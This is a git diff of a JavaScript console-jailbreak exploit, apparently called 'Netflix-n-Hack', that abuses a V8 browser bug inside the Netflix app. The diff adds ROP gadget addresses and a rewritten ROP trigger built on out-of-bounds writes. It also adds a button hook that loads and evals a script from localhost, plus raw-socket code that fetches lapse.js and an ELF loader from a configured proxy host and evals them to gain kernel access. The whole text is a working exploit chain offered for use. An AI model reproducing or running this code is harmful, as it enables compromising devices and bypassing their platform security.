@@ -2,6 +2,9 @@
 // based on https://starlabs.sg/blog/2022/12-the-hole-new-world-how-a-small-leak-will-sink-a-great-browser-cve-2021-38003/
 // thanks to Gezines y2jb for advice and reference : https://github.com/Gezine/Y2JB/blob/main/download0/cache/splash_screen/aHR0cHM6Ly93d3cueW91dHViZS5jb20vdHY%3D/splash.html
 
+const ip_script = ""; // ip address of your computer running mitmproxy, MITM Proxy is handling it --> Needs to be updated
+const ip_script_port = 8080; //port that mitmproxy is on
+
 // #region misc
 
 let SYSCALL = {
@@ -394,6 +397,12 @@ gadgets_eu_6 = {
     pop_rsp_pop_rbp:       0x17ecb4en,
     mov_qword_ptr_rdi_rax: 0x1dcba9n,
     mov_qword_ptr_rdi_rdx: 0x36db4en,
+
+    /** Following Gadgets used to mov_rdi_qword_ptr_rsi **/
+    mov_rsi_qword_ptr_rsi_test_sil_1_jne: 0x12ee681n,   // mov rsi, qword ptr [rsi] ; test sil, 1 ; jne 0x12ee68b ; ret
+                                                        // the jne is neved executed if the value in rsi does not end in 1
+    mov_rdi_rsi_mov_qword_ptr_rdx_rdi:    0x09776c4n,   // mov rdi, rsi ; mov qword ptr [rdx], rdi ; ret
+                                                        // point rdx to a valid address
 };
 
 gadgets_us_5 = {
@@ -414,6 +423,12 @@ gadgets_us_5 = {
     pop_rsp_pop_rbp:       0x17ecb4en,
     mov_qword_ptr_rdi_rax: 0x1dcba9n,
     mov_qword_ptr_rdi_rdx: 0x36db4en,
+
+    /** Following Gadgets used to mov_rdi_qword_ptr_rsi **/
+    mov_rsi_qword_ptr_rsi_test_sil_1_jne: 0x12ee681n,   // mov rsi, qword ptr [rsi] ; test sil, 1 ; jne 0x12ee68b ; ret
+                                                        // the jne is neved executed if the value in rsi does not end in 1
+    mov_rdi_rsi_mov_qword_ptr_rdx_rdi:    0x09776c4n,   // mov rdi, rsi ; mov qword ptr [rdx], rdi ; ret
+                                                        // point rdx to a valid address
 };
 
 gadgets_list = {
@@ -438,6 +453,50 @@ class gadgets {
     }
 };
 
+function hook_tryagain(){
+        /***** Hook "Try Again" button to reload exploit *****/
+        if (typeof util !== 'undefined' && util.changeLocation) {
+            const original_changeLocation = util.changeLocation;
+            util.changeLocation = function(url) {
+                logger.log("Reloading Javascript...");
+                
+                logger.flush();
+
+                // Load and eval our injected script instead of reloading app
+                nrdp.gibbon.load({
+                    url: 'http://127.0.0.1:40002/js/common/config/text/config.text.lruderrorpage.en.js',
+                    secure: false
+                }, function(result) {
+                    logger.flush();
+
+                    if (result.data) {
+                        logger.flush();
+                        try {
+                            eval(result.data);
+                        } catch (e) {
+                            logger.log("Eval error: " + e.message);
+                            logger.log("Stack: " + (e.stack || "none"));
+                            logger.flush();
+                        }
+                    } else {
+                        logger.log("Load failed - no data received");
+                        logger.flush();
+                    }
+                });
+
+                // Throw exception to stop execution and prevent state.exit
+                throw new Error("Exploit reload initiated");
+            };
+            logger.log("Enabled Instant JS reload...");
+            logger.flush();
+        } else {
+            logger.log("WARNING: util.changeLocation not found!");
+            logger.flush();
+        }
+    }
+
+
+
 function stringToBytes (str) {
     const len = str.length;
     const bytes = new Uint8Array(len);
@@ -459,7 +518,7 @@ function main () {
     logger.flush(); // Force immediate display
 
     try {
-
+        hook_tryagain();
         const g = new gadgets(); // Load gadgets
 
         let hole = make_hole();
@@ -1002,9 +1061,9 @@ function main () {
         */
 
         write64(fake_frame  - 0x20n, base_heap_add + fake_bytecode);  // Put the return code (by pointer) in R14
-                                                                    // this is gonna be offseted by R9
-        write64(fake_frame  - 0x28n, 0x00n);                    // Force the value of R9 = 0                                                                          
-        write64(fake_frame  - 0x18n, 0xff00000000000000n); // Fake value for (Builtins_InterpreterEntryTrampoline+286) to skip break * Builtins_InterpreterEntryTrampoline+303
+                                                                      // this is gonna be offseted by R9
+        write64(fake_frame  - 0x28n, 0x00n);                          // Force the value of R9 = 0
+        write64(fake_frame  - 0x18n, 0xff00000000000000n);            // Fake value for (Builtins_InterpreterEntryTrampoline+286) to skip break * Builtins_InterpreterEntryTrampoline+303
                                                                           
         write64(fake_frame + 0x08n, g.get('pop_rsp')); // pop rsp ; ret --> this change the stack pointer to your stack
         write64(fake_frame + 0x10n, rop_address);
@@ -1053,11 +1112,8 @@ function main () {
             fake_rop[i++] = real_rbp;
             
             write64(add_rop_smash_code_store, 0xab00260325n);
-            oob_arr[39] = base_heap_add + fake_frame;
-            rop_smash(obj_arr[0]);          // Call ROP
-
-            //return BigInt(return_value_buffer[0]); // Return value returned by function
-            // Seems like this is not being executed
+            fake_rw[59] = (fake_frame & 0xffffffffn); // Only 32 bits needed
+            rop_smash(fake_obj_arr[0]);               // Call ROP
         }
 
         function call (address, arg1 = 0x0n, arg2 = 0x0n, arg3 = 0x0n, arg4 = 0x0n, arg5 = 0x0n, arg6 = 0x0n) {
@@ -1190,79 +1246,162 @@ function main () {
         }
 
         send_notification("ð\x9F¥³ð\x9F¥³ Netflix-n-Hack ð\x9F¥³ð\x9F¥³");
-        send_notification("BETA TEST (Auto elfldr)\n Expect instability");
-        
 
-        function fetch_file(filename, dest_addr) {
-            var xhr = new XMLHttpRequest();
-            xhr.open("GET", "http://localcontrol.netflix.com/js/" + filename, false);
-            xhr.send();
-            
-            if (!xhr.responseText) {
-                logger.log("Error: Empty response for " + filename);
-                return 0;
+        if(ip_script === ""){send_notification("ERROR: NO IP ADDRESS CONFIGURED");}
+        /******************************************************************************/
+        /**********             Usefull functions for automation             **********/
+        /******************************************************************************/
+
+        function parseIP(ip_str) {
+            const parts = ip_str.split(".");
+            return ( (parseInt(parts[0]) | (parseInt(parts[1]) << 8) | (parseInt(parts[2]) << 16) | (parseInt(parts[3]) << 24)) >>> 0);
+        }
+
+        function connectToServer(port) {
+            const sock = syscall(SYSCALL.socket, 2n, 1n, 0n);
+
+            if (Number(sock) < 0)
+                logger.log(`Socket creation failed: ${Number(sock)}`);
+
+            const sockaddr = malloc(16);
+
+            write8_uncompressed(sockaddr + 1n, 2n);
+
+            const port_be = ((port & 0xff) << 8) | ((port >> 8) & 0xff);
+
+            write16_uncompressed(sockaddr + 2n, BigInt(port_be));
+            write32_uncompressed(sockaddr + 4n, BigInt(parseIP(ip_script)));
+
+            const ret = syscall(SYSCALL.connect, sock, sockaddr, 16n);
+
+            if(ret == 0xffffffffffffffffn) {
+                syscall(SYSCALL.close, sock);
+                logger.log(`Connect failed: ${Number(ret)}` + " error: " + get_error_string());
             }
-            
-            // Write bytes directly to memory
-            const length = xhr.responseText.length;
-            for (let i = 0; i < length; i++) {
-                const byte = xhr.responseText.charCodeAt(i) & 0xFF;
-                write8_uncompressed(dest_addr + BigInt(i), BigInt(byte));
+            return sock;
+        }
+
+        function httpGet(sock, path) {
+            const request = `GET ${path} HTTP/1.1\r\nHost: ${ip_script}\r\nConnection: close\r\n\r\n`;
+            ret = syscall(SYSCALL.write, sock, alloc_string(request), BigInt(request.length));
+            if(ret == 0xffffffffffffffffn) {
+                logger.log(get_error_string() + " error: " + get_error_string());;
             }
-            
-            logger.log("Wrote " + length + " bytes to " + hex(dest_addr));
-            return length;
+        }
+
+        // It fakes an HTML request to the MITM proxy
+        // The proxy intercepts it and respons with the file
+        // That needs to be defined in the proxy.py script
+        // Arguments: filename and buffer to store data
+        function fetch_file (filename, buffer_return) {
+            let sock;
+            let fd = -1n;
+            let total_received = 0;
+            try {
+                sock = connectToServer(ip_script_port);       // Connect to the MITM proxy to fake a request
+                httpGet(sock, `/js/${filename}`);
+
+                const buffer = malloc(800*1024);
+                let header_found = false;
+                let search_str = "";
+
+                // Loop over the initial part of the data to get the HTTP header
+                while (!header_found) {
+                    const bytes_read = Number(syscall(SYSCALL.read, sock, buffer, 8192n));
+
+                    if (bytes_read <= 0) {
+                        throw new Error("Connection closed before HTTP header was found.");
+                    }
+                    for (let i = 0; i < bytes_read; i++) {
+                        search_str += String.fromCharCode(Number(read8_uncompressed(buffer + BigInt(i))),
+                        );
+                    }
+
+                    const header_end_idx = search_str.indexOf("\r\n\r\n");
+
+                    if (header_end_idx !== -1) {
+                        header_found = true;
+
+                        const body_offset = header_end_idx + 4;
+
+                        if (body_offset < search_str.length) {
+                            const body_part = search_str.substring(body_offset);
+                            for (let i = 0; i < body_part.length; i++) {
+                                write8_uncompressed(buffer_return + BigInt(i), body_part.charCodeAt(i));
+                                total_received++;
+                            }
+                        }
+                    } else if (search_str.length > 16384) {
+                        throw new Error("Could not find HTTP header; response too large");
+                    }
+                }
+
+                //logger.log("Received with header bytes: " + total_received);
+                // Loop over the rest of the data
+                while (true) {
+                    const n = syscall(SYSCALL.read, sock, buffer_return + BigInt(total_received), 8192n*8n);
+                    if (n === 0xffffffffffffffffn || n === 0n) break;
+                    total_received += Number(n);
+                    //logger.log("Received after header bytes: " + total_received);
+                }
+            } catch (e) {
+                logger.log(`- File download failed: ${e}`);
+                logger.flush();
+                return false;
+            } finally {
+                if (sock) syscall(SYSCALL.close, sock);
+                if (fd >= 0) syscall(SYSCALL.close, fd);
+                //logger.log("Total received: " + total_received);
+                return total_received;
+            }
+        }
+
+        function bytes_to_string (add, size) {
+            let str = '';
+            let byte;
+
+            let offset = 0;
+
+            while (true) {
+                try {
+                    byte = read8_uncompressed(add + BigInt(offset));
+                } catch (e) {
+                    logger.log("read_cstring error reading memory at address " + hex(add) + ", e.message");
+                    break;
+                }
+                str += String.fromCharCode(Number(byte));
+                offset++;
+                if (offset == size) break;
+            }
+            return str;
         }
 
 
-        function get_script(url) { 
-            var xhr = new XMLHttpRequest(); //lol
-            xhr.open("GET", url, false); 
-            xhr.send();
-            return xhr.responseText;
+        // Arguments: script_name configured in MITM proxy
+        // Returned value: JS String (null if error)
+        function get_script(script_name) {
+            const buffer_read = malloc(300*1024);
+            let bytes_received = fetch_file(script_name, buffer_read);
+            let script_str = bytes_to_string(buffer_read, bytes_received);
+            return script_str;
         }
-        
-        // AUTO-RUN here:
-    
-     
-        let lapse1 = get_script("1_lapse_prepare_1.js");
-        let lapse2 = get_script("2_lapse_prepare_2.js");
-        let lapse3 = get_script("3_lapse_nf.js");
-        let elfldr = get_script("elf_loader.js");
-   
-     
-        /***** Give time to Gibbon to populate UI *****/
-        sleep(20000);
-        logger.init();
-        logger.flush();
+
 
         /***** Let's trigger Lapse *****/
-        
-        
-        send_notification("Loading Exploit!");
-        
-        eval(lapse1);
-        send_notification("lapse 1");
-        sleep(5000);
+
+
+        script = get_script("lapse.js");
+        eval(script);
         logger.flush();
-        eval(lapse2);
-        send_notification("lapse 2");
-        sleep(5000);
-        eval(lapse3);
-        send_notification("lapse 3");
-        sleep(10000);
-        eval(elfldr);
-        send_notification("elfldr");
-        send_notification("Exploit Done!");
-        send_notification("no crash? UwU");
-        logger.log("all js executed");
+        send_notification("elf_loader.js");
+        script = get_script("elf_loader.js");
+        eval(script);
         logger.flush();
 
         if (!is_jailbroken()) {
-            send_notification("Jailbreak didn't succeed in 3 attempts.\nPlease restart your console and try again.");
-            throw new Error("Jailbreak didn't succeed in 3 attempts. Please restart your console and try again.");
+            send_notification("Jailbreak didn't succeed");
+            throw new Error("Jailbreak didn't succeed");
         }
-
 
 
     } catch (e) {
